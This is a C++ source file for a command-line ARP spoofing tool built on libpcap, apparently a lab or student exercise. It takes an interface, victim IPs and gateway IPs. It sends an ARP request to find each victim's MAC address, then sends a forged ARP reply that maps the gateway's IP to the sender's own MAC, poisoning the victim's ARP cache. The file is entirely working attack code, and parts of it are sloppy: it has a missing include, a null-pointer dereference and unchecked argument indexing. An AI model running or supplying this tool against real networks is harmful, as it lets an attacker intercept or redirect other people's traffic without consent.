#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "GetMac.h"
#include "GetIp.h"

using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
        EthHdr eth_;
        ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
        printf("syntax: send-arp-test <interface> <senderip> <gatewayip>\n");
        printf("sample: send-arp-test wlan0 <> <>\n");
}

int send_arp_request(pcap_t* handle,char* dev,char*victim_ip);
int send_arp_spoof(pcap_t* handle,EthArpPacket* reply,char *dev,char *gateway_ip,char*victim_ip);
EthArpPacket* recieve_packet(pcap_t* handle);

int main(int argc, char* argv[]) {
        int i=2;
	if (argc < 3) {
                usage();
                return -1;
        }
	while(i<argc)
	{
        		char* dev = argv[1];
			char* victim_ip = argv[i];
			char* gateway_ip=argv[i+1];
        		char errbuf[PCAP_ERRBUF_SIZE];
			pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
		        if (handle == nullptr) {
                		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        		        return -1;
        		}
			cout<<1<<endl;
       			send_arp_request(handle,dev,victim_ip);
			EthArpPacket* reply=recieve_packet(handle);
			if(reply==NULL)
			{
				cout<<"can't recieve reply"<<endl;
			}
			send_arp_spoof(handle,reply,dev,gateway_ip,victim_ip);
				pcap_close(handle);
			i=i+2;
	}		
}

int send_arp_spoof(pcap_t* handle,EthArpPacket* reply,char *dev,char *gateway_ip,char*victim_ip)
{
        EthArpPacket packet;

        string my_mac = getMacAddress(dev);

        packet.eth_.dmac_ = Mac(std::string(reply->arp_.smac_));
        packet.eth_.smac_ = Mac(my_mac);
        packet.eth_.type_ = htons(EthHdr::Arp);
        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::SIZE;
        packet.arp_.pln_ = Ip::SIZE;
        packet.arp_.op_ = htons(ArpHdr::Reply);
        packet.arp_.smac_ = Mac(my_mac);
        packet.arp_.sip_ = htonl(Ip(gateway_ip));
        packet.arp_.tmac_ = Mac(std::string(reply->arp_.smac_));
        packet.arp_.tip_ = htonl(Ip(victim_ip));
	cout<<std::string(reply->arp_.smac_)<<endl;
	cout<<gateway_ip<<endl;
	cout<<victim_ip<<endl;
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
	cout << res << endl;
	return res;
}
int send_arp_request(pcap_t* handle,char* dev,char*victim_ip)
{
        EthArpPacket packet;

        string my_mac = getMacAddress(dev);
        string my_ip = getIPAddress(dev);

        packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
        packet.eth_.smac_ = Mac(my_mac);
        packet.eth_.type_ = htons(EthHdr::Arp);
        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::SIZE;
        packet.arp_.pln_ = Ip::SIZE;
        packet.arp_.op_ = htons(ArpHdr::Request);
        packet.arp_.smac_ = Mac(my_mac);
        packet.arp_.sip_ = htonl(Ip(my_ip));
        packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
        packet.arp_.tip_ = htonl(Ip(victim_ip));


        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }

		return res;
}
EthArpPacket* recieve_packet(pcap_t* handle)
{
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue; // timeout 발생
        if (res == -1 || res == -2) {
            fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        EthArpPacket* recievedPacket = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(packet));

        if (recievedPacket->eth_.type() == EthHdr::Arp && recievedPacket->arp_.op() == ArpHdr::Reply) 
	{
        	for (int i = 0; i < header->len; i++) 
		{
            		printf("%02x ", packet[i]);
        	    	if ((i + 1) % 16 == 0) printf("\n");
        	}
		return recievedPacket; 

        }
    }
	return NULL;
}
